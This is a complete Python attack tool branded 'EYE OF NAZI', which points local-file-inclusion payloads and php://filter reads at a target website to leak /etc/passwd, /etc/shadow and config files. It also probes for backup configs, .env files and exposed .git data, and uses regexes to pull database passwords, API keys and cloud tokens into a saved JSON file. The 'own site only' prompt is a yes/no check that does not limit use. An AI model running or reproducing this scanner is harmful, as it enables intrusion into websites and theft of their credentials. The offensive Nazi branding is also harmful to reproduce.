#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EYE OF NAZI v55.0 - COMPACT READER
# Made by Cyber Kurd Team

import sys, os, re, ssl, json
import urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGO = r"""
\033[91m\033[1m
   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
\033[0m\033[93m\033[1m                    EYE OF NAZI
\033[96m=============================================================\033[0m
\033[97m\033[1m              COMPACT READER v55.0\033[0m
\033[2m              Made by Cyber Kurd Team\033[0m
\033[96m=============================================================\033[0m
"""

PARAMS = ['file', 'page', 'path', 'include', 'inc', 'load', 'read',
          'view', 'template', 'dir', 'root', 'doc', 'filename', 'name',
          'url', 'src', 'source', 'content', 'show', 'display',
          'cat', 'id', 'pid', 'post', 'article', 'item', 'mod',
          'action', 'link', 'redirect', 'target', 'f', 'p', 'l', 'c']

LFI_PAYLOADS = [
    '../../../../../../etc/passwd',
    '../../../../../../etc/shadow',
    '../../../../../../etc/hosts',
    '../../../../../../proc/self/environ',
    '../../../../../../windows/win.ini',
    '....//....//....//....//....//etc/passwd',
    '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/convert.base64-encode/resource=config.php',
    'php://filter/convert.base64-encode/resource=wp-config.php',
    '/etc/passwd', '/etc/shadow', '/proc/self/environ',
]

LFI_IND = ['root:x:0:0', 'root:*:0:0', 'daemon:x:', 'bin:x:',
           'www-data:', '[extensions]', '[boot loader]']

BACKUP_FILES = [
    'wp-config.php.bak', 'wp-config.php~', 'wp-config.php.old',
    'wp-config.php.save', 'wp-config.txt', 'wp-config.php.swp',
    'config.php.bak', 'config.php~', 'config.php.old', 'config.php.txt',
    'config.php.swp', 'configuration.php.bak', 'config.inc.php.bak',
    'settings.php.bak', 'database.php.bak', 'db.php.bak',
    'index.php.bak', 'index.php~', 'index.php.old', 'index.php.txt',
    '.env.bak', '.env.old', '.env.save', '.env.backup', '.env.txt',
    'config.json.bak', 'config.json~', 'config.yml.bak',
    'settings.py.bak', 'database.yml.bak', '.htaccess.bak',
    'web.config.bak',
]

GIT_FILES = [
    '.git/config', '.git/HEAD', '.git/index', '.git/logs/HEAD',
    '.git/refs/heads/master', '.git/refs/heads/main',
    '.git/COMMIT_EDITMSG', '.gitignore', '.gitmodules',
    '.gitattributes', '.svn/entries', '.svn/wc.db',
    '.hg/hgrc', '.git-credentials', '.gitconfig',
]

PHP_FILES = [
    'wp-config.php', 'config.php', 'configuration.php',
    'config.inc.php', 'settings.php', 'database.php',
    'db.php', 'includes/config.php', 'includes/db.php',
    'admin/config.php', 'application/config.php', 'app/config.php',
    'index.php', 'wp-load.php', 'wp-settings.php',
]

PASS_PATTERNS = [
    r'define\s*\(\s*[\'"]DB_NAME[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]DB_USER[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]DB_PASSWORD[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]DB_HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'DB_PASSWORD\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'DB_PASS\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'DB_USER\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'DB_NAME\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'DB_HOST\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'password["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'passwd["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'secret["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'token["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'AKIA[0-9A-Z]{16}',
    r'ghp_[0-9a-zA-Z]{36}',
    r'sk_live_[0-9a-zA-Z]{24,}',
]

API_ENDPOINTS = [
    'api', 'api/', 'api/v1', 'api/v2', 'api/users', 'api/admin',
    'api/login', 'api/config', 'api/status', 'api/health',
    'rest', 'rest/', 'rest/api', 'rest/v1', 'graphql', 'graphiql',
    'swagger.json', 'openapi.json', 'api-docs', 'docs',
]

CMS_PATHS = {
    'Joomla': ['administrator/', 'components/', 'modules/',
               'configuration.php', 'htaccess.txt'],
    'Drupal': ['sites/default/', 'core/', 'modules/', 'CHANGELOG.txt'],
    'Laravel': ['storage/', 'bootstrap/', 'artisan', '.env'],
    'Django': ['static/', 'media/', 'manage.py', 'settings.py'],
    'CodeIgniter': ['application/', 'system/', 'index.php'],
    'Symfony': ['bin/', 'config/', 'src/', 'vendor/'],
}


class Client:
    def __init__(self, timeout=10, cookie=None, proxy=None):
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"

    def req(self, url):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if self.proxy:
            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
        else:
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookie:
            hdrs['Cookie'] = self.cookie
        r = urllib.request.Request(url, headers=hdrs)
        try:
            rp = op.open(r, timeout=self.timeout)
            body = rp.read()
            return {'s': rp.getcode(), 't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'err': None}
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
            except Exception:
                body = b''
            return {'s': e.code, 't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'err': None}
        except Exception as e:
            return {'s': 0, 't': '', 'n': 0, 'err': str(e)}


class Scan:
    def __init__(self, url, cl, threads=30):
        self.url = url.rstrip('/')
        self.cl = cl
        self.threads = threads
        self.f = []
        self.checked = 0
        self.files_read = []
        self.passwords = []

    def add(self, u, p, t, pl, ev, sev):
        self.f.append({'url': u, 'param': p, 'type': t, 'payload': pl,
                       'evidence': ev[:300] if ev else '', 'severity': sev})
        icons = {'LFI': '\033[95m[LFI]\033[0m',
                 'FILE': '\033[92m[FILE]\033[0m',
                 'PHP': '\033[41m\033[97m[PHP]\033[0m',
                 'BACKUP': '\033[92m[BACKUP]\033[0m',
                 'GIT': '\033[41m\033[97m[GIT]\033[0m',
                 'PASSWORD': '\033[41m\033[97m[PASSWORD]\033[0m',
                 'CMS': '\033[96m[CMS]\033[0m',
                 'API': '\033[96m[API]\033[0m'}
        icon = icons.get(t, '[' + t + ']')
        print("\n  " + icon + " \033[1m" + sev + "\033[0m")
        print("    URL     : " + u[:120])
        if p:
            print("    Param   : \033[93m" + p + "\033[0m")
        if pl:
            print("    Payload : " + pl[:80])
        if ev:
            print("    Evidence: " + ev[:250])

    def inject(self, url, param, payload):
        pr = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
        qs[param] = [payload]
        return urllib.parse.urlunparse(
            (pr.scheme, pr.netloc, pr.path, pr.params,
             urllib.parse.urlencode(qs, doseq=True), pr.fragment))

    def params(self, url):
        q = urllib.parse.urlparse(url).query
        if not q:
            return []
        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys())

    def extract_passwords(self, text):
        results = []
        for pat in PASS_PATTERNS:
            try:
                for m in re.findall(pat, text, re.IGNORECASE):
                    if isinstance(m, tuple):
                        for x in m:
                            if x and 3 <= len(x) <= 200:
                                results.append(x)
                    elif m and 3 <= len(m) <= 200:
                        results.append(m)
            except Exception:
                pass
        return list(set(results))

    def check_path(self, base, path):
        url = base.rstrip('/') + '/' + path.lstrip('/')
        r = self.cl.req(url)
        self.checked += 1
        if r['err'] or r['s'] != 200:
            return None
        return {'url': url, 's': r['s'], 'n': r['n'], 'path': path, 'text': r['t']}

    def test_lfi(self):
        print("\n\033[96m[1/7]\033[0m LFI Auto Params...")
        params = self.params(self.url)
        if not params:
            params = PARAMS[:20]
        tested = 0
        found = 0
        for p in params:
            for pl in LFI_PAYLOADS[:8]:
                test_url = self.inject(self.url, p, pl)
                r = self.cl.req(test_url)
                tested += 1
                if r['err']:
                    continue
                hit = False
                for ind in LFI_IND:
                    if ind in r['t']:
                        self.add(test_url, p, 'LFI', pl,
                                 "File leaked: " + ind, "CRITICAL")
                        self.files_read.append({'url': test_url, 'param': p,
                                                'payload': pl, 'indicator': ind})
                        found += 1
                        hit = True
                        break
                if hit:
                    break
        print("  \033[92m[+]\033[0m Tested " + str(tested) + " | Found " + str(found))

    def test_php_filter(self):
        print("\n\033[96m[2/7]\033[0m PHP Filter...")
        params = self.params(self.url)
        if not params:
            params = ['file', 'page', 'path', 'include']
        found = 0
        for p in params[:4]:
            for f in ['index.php', 'config.php', 'wp-config.php', '.env']:
                pl = 'php://filter/convert.base64-encode/resource=' + f
                test_url = self.inject(self.url, p, pl)
                r = self.cl.req(test_url)
                if r['err'] or r['s'] != 200:
                    continue
                import base64
                try:
                    b64 = re.search(r'[A-Za-z0-9+/=]{60,}', r['t'])
                    if b64:
                        decoded = base64.b64decode(b64.group(0)).decode('utf-8', 'ignore')
                        if '<?php' in decoded or 'DB_' in decoded:
                            self.add(test_url, p, 'PHP', pl,
                                     "PHP source leaked", "CRITICAL")
                            self.files_read.append({'url': test_url, 'param': p,
                                                    'payload': pl, 'content': decoded[:500]})
                            found += 1
                            break
                except Exception:
                    pass
        print("  \033[92m[+]\033[0m Found " + str(found))

    def test_backup(self):
        print("\n\033[96m[3/7]\033[0m Backup Files...")
        found = 0
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            fs = {ex.submit(self.check_path, self.url, p): p for p in BACKUP_FILES}
            for fut in as_completed(fs):
                try:
                    res = fut.result()
                    if res and res['n'] > 0:
                        self.add(res['url'], '', 'BACKUP', '',
                                 "Backup (" + str(res['n']) + "B)", "CRITICAL")
                        pwds = self.extract_passwords(res['text'])
                        for pwd in pwds[:3]:
                            self.passwords.append({'url': res['url'], 'value': pwd})
                            self.add(res['url'], '', 'PASSWORD', pwd,
                                     "Password found", "CRITICAL")
                        found += 1
                except Exception:
                    pass
        print("  \033[92m[+]\033[0m Found " + str(found))

    def test_git(self):
        print("\n\033[96m[4/7]\033[0m Git Exposure...")
        found = 0
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            fs = {ex.submit(self.check_path, self.url, p): p for p in GIT_FILES}
            for fut in as_completed(fs):
                try:
                    res = fut.result()
                    if res and res['n'] > 0:
                        self.add(res['url'], '', 'GIT', '',
                                 "Git (" + str(res['n']) + "B)", "CRITICAL")
                        found += 1
                except Exception:
                    pass
        print("  \033[92m[+]\033[0m Found " + str(found))

    def test_php_source(self):
        print("\n\033[96m[5/7]\033[0m PHP Source...")
        found = 0
        for p in PHP_FILES:
            full = self.url.rstrip('/') + '/' + p
            r = self.cl.req(full)
            if r['err'] or r['s'] != 200:
                continue
            if '<?php' in r['t'] or 'define(' in r['t'] or 'DB_' in r['t']:
                self.add(full, '', 'PHP', '',
                         "PHP source (" + str(r['n']) + "B)", "CRITICAL")
                pwds = self.extract_passwords(r['t'])
                for pwd in pwds[:5]:
                    self.passwords.append({'url': full, 'value': pwd})
                    self.add(full, '', 'PASSWORD', pwd,
                             "Password", "CRITICAL")
                found += 1
        print("  \033[92m[+]\033[0m Found " + str(found))

    def test_cms(self):
        print("\n\033[96m[6/7]\033[0m CMS Detection...")
        found = 0
        for cms, paths in CMS_PATHS.items():
            hits = 0
            for p in paths:
                full = self.url.rstrip('/') + '/' + p
                r = self.cl.req(full)
                if not r['err'] and r['s'] in (200, 301, 302, 403):
                    hits += 1
            if hits >= 2:
                self.add(self.url, '', 'CMS', '',
                         cms + " (" + str(hits) + " paths)", "HIGH")
                found += 1
        print("  \033[92m[+]\033[0m Found " + str(found))

    def test_api(self):
        print("\n\033[96m[7/7]\033[0m API Fuzzing...")
        found = 0
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            fs = {ex.submit(self.check_path, self.url, p): p for p in API_ENDPOINTS}
            for fut in as_completed(fs):
                try:
                    res = fut.result()
                    if res and res['s'] in (200, 401, 403):
                        self.add(res['url'], '', 'API', '',
                                 "API (" + str(res['s']) + ")", "MEDIUM")
                        found += 1
                except Exception:
                    pass
        print("  \033[92m[+]\033[0m Found " + str(found))

    def run_all(self):
        print("\n\033[96m" + "=" * 60 + "\033[0m")
        print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
        print("\033[96m" + "=" * 60 + "\033[0m")

        try:
            self.test_lfi()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_php_filter()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_backup()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_git()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_php_source()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_cms()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_api()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        print("\n\033[96m" + "=" * 60 + "\033[0m")
        crit = sum(1 for f in self.f if f['severity'] == 'CRITICAL')
        high = sum(1 for f in self.f if f['severity'] == 'HIGH')
        med = sum(1 for f in self.f if f['severity'] == 'MEDIUM')
        print("  Files Checked: " + str(self.checked))
        print("  Files Read: " + str(len(self.files_read)))
        print("  Passwords: \033[1m\033[91m" + str(len(self.passwords)) + "\033[0m")
        print("  Findings: \033[1m\033[91m" + str(len(self.f)) + "\033[0m")
        print("    \033[41m\033[97m CRITICAL \033[0m " + str(crit))
        print("    \033[43m HIGH     \033[0m " + str(high))
        print("    \033[93m MEDIUM   \033[0m " + str(med))
        print("\033[96m" + "=" * 60 + "\033[0m\n")

    def save_json(self, filename):
        with open(filename, 'w', encoding='utf-8') as fp:
            json.dump({'target': self.url, 'findings': self.f,
                       'files_read': self.files_read,
                       'passwords': self.passwords}, fp, indent=2, ensure_ascii=False)
        print("\033[92m[+]\033[0m Saved: " + filename)


def is_url(t):
    if t.startswith(('http://', 'https://')):
        return True
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', t):
        return True
    return False


def main():
    print(LOGO)
    print("\n\033[96m" + "=" * 60 + "\033[0m")
    print("\033[92m  Compact Reader - Type your OWN site.\033[0m")
    print("\033[93m  Warning: Only use on YOUR OWN site!\033[0m")
    print("\033[96m" + "=" * 60 + "\033[0m\n")

    st = {'cookie': None, 'proxy': None, 'threads': 30, 'last': None}

    while True:
        try:
            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\033[93m[!] Bye\033[0m")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd in ('exit', 'quit', 'q'):
            print("\033[93mBye.\033[0m")
            break
        elif cmd == 'cookie':
            if arg:
                st['cookie'] = arg
                print("\033[92m[+] Cookie set\033[0m")
        elif cmd == 'proxy':
            if arg:
                st['proxy'] = arg
                print("\033[92m[+] Proxy set\033[0m")
        elif cmd == 'threads':
            if arg:
                try:
                    st['threads'] = int(arg)
                    print("\033[92m[+] Threads: " + arg + "\033[0m")
                except Exception:
                    pass
        elif cmd == 'status':
            print("\n  Cookie: " + str(st['cookie']))
            print("  Proxy: " + str(st['proxy']))
            print("  Threads: " + str(st['threads']) + "\n")
        elif cmd == 'clear':
            os.system('clear')
            print(LOGO)
        elif cmd == 'save':
            if st['last'] and arg:
                st['last'].save_json(arg)
        elif is_url(cmd):
            url = cmd if cmd.startswith(('http://', 'https://')) else 'http://' + cmd
            print("\n\033[93m[!]\033[0m Only use on YOUR OWN site!")
            print("\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
            conf = input("\033[93m    Confirm you own this site? (yes/no): \033[0m").strip().lower()
            if conf not in ('yes', 'y', 'بەڵێ', 'b'):
                print("\033[93m[!] Aborted.\033[0m")
                continue
            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
            sc = Scan(url, cl, threads=st['threads'])
            try:
                sc.run_all()
                st['last'] = sc
            except KeyboardInterrupt:
                print("\n\033[93m[!] Stopped\033[0m")
                st['last'] = sc
            except Exception as e:
                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")
        else:
            print("\033[91m[!] Unknown: " + cmd + "\033[0m")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Bye\033[0m")
